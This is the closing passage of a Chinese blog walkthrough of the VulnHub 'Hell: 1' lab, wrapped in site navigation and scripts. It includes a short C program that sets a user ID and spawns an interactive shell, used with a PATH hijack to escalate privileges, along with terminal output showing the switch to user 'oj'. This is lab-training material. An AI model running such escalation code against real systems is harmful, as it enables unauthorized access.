+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> setuid( <span class="number">1005</span> );</span><br><span class="line"> system(<span class="string">&quot;/usr/bin/id&quot;</span>);</span><br><span class="line"> system( <span class="string">&quot;/bin/sh -i&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件已编译，放置在 <code>/tmp</code> 目录下并设置为可执行文件</p>
+<p>环境变量路径已按上次修改，一切就绪</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./part1</span><br><span class="line">Checking integrity of part2... Done!!</span><br><span class="line"></span><br><span class="line">Checking integrity of calling target... Done!!</span><br><span class="line"></span><br><span class="line">Binary and target confirmed.</span><br><span class="line"></span><br><span class="line">Can<span class="string">&#x27;t touch this *nah na na na na naaaaaaaa nah*</span></span><br><span class="line"><span class="string">uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">oj</span></span><br></pre></td></tr></table></figure>
+
+<p>oj 用户只有一个文件，一个名为 echo 的二进制文件，它的功能就是重复你发送的内容</p>
+<p>这一关需要结合二进制——字符串格式化漏洞去打才行，所以不会记录</p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag" title="任意文件读取">任意文件读取</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="tag" title="弱口令">弱口令</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag" title="提权">提权</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%B6%8A%E6%9D%83/" rel="tag" title="越权">越权</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Flick：1" class="lazyload">
+        <a href="/2026/04/01/Flick%201/" aria-label="前一篇: VulnHub Flick：1" title="前一篇: VulnHub Flick：1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub Flick：1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub SkyTower：1" class="lazyload">
+      <a href="/2026/04/01/SkyTower%201/" aria-label="后一篇: VulnHub SkyTower：1"  title="后一篇: VulnHub SkyTower：1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub SkyTower：1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hell-1"><span class="toc-number">1.</span> <span class="toc-text">Hell: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin"><span class="toc-number">1.1.1.</span> <span class="toc-text">Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#intruder"><span class="toc-number">1.2.1.</span> <span class="toc-text">intruder</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#intruder%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">intruder（双写绕过）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.4.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Notes%EF%BC%88%E7%BB%93%E5%90%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%BB%84%E5%90%88%E6%8B%B3%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">Notes（结合任意文件读取组合拳）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.5.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PGP-%E5%8A%A0%E5%AF%86%E9%82%AE%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.5.3.</span> <span class="toc-text">PGP 加密邮件破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.4.</span> <span class="toc-text">环境变量劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TrueCrypt-%E7%88%86%E7%A0%B4"><span class="toc-number">1.5.5.</span> <span class="toc-text">TrueCrypt 爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.6.</span> <span class="toc-text">SSH 私钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81-1"><span class="toc-number">1.5.7.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub Hell：1",
+          url: "http://example.com/2026/04/01/Hell%201/",
+          excerpt: "",
+          description: "",
+          stripContent: "Hell: 1项目地址：https://download.vulnhub.com/hell/hell.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  666 端口响应内容如下 123Welcome to the Admin PanelArchiving latest version on webserver (echoserver.bak)...Starting echo server and monitorin",
+          date: "Wed Apr 01 2026 16:19:00 GMT+0800",
+          updated: "Wed Apr 01 2026 17:06:41 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
